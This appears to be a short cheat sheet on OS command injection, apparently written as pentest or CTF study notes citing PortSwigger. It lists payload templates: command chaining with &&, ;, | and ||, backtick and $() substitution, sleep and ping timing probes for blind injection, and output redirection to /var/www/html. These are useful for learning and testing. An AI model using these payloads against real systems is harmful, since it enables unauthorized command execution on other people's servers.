

# summary:
* [zero protection](#zero-protection)
* [zero protection with multiple parameter](#zero-protection-with-multiple-parameter)
* [blind injection with time delay](#blind-injection-with-time-delay)
* [blind injection with redirection](#blind-injection-with-redirection)
* [source](#source)


# zero protection

Usually you can inject the payload in the vulnerable field directly :

```
With GET request
/?myparam=CMD

With POST request play with burp or write a script.
myparam=CMD

```
replace CMD by whatever command you want :
id,ls,whoami,dir(windows),...


# zero protection with multiple parameter

You can try to escape/add a command to the previous argument : 

```
 && CMD &&
 & CMD & 
 ;CMD;
 |CMD|
 ||CMD|| 

```
replace CMD by whatever command you want :
id,ls,whoami,dir(windows),...


To perform command injection on linux system you can use also backticks or dollar character :
```
`CMD` 
$(CMD)

```
replace CMD by whatever command you want :
id,ls,whoami,dir(windows),...


We can also use # caracter to comment out what is following our command.<br>
ex: <br>
23 && ls #   => everything which follow # will not be executed <br>

# blind injection with time delay


In some case you will not receive the output of your command, in this case you can try to play with command involving time.<br>
You can use command like :<br>
"sleep 5" => sleep 5 second <br>
or <br>
"ping -c 20 127.0.0.1" : send 20 icmp packets to the loopback address<br>


# blind injection with redirection

redirect command out in a directory that you have read/write access.<br>
You can try default directory like: <br>
/var/www/html <br>
or try to find files,pictures and find if there are absolute path (these directories should have read/write permission)


# source

https://portswigger.net/web-security/os-command-injection
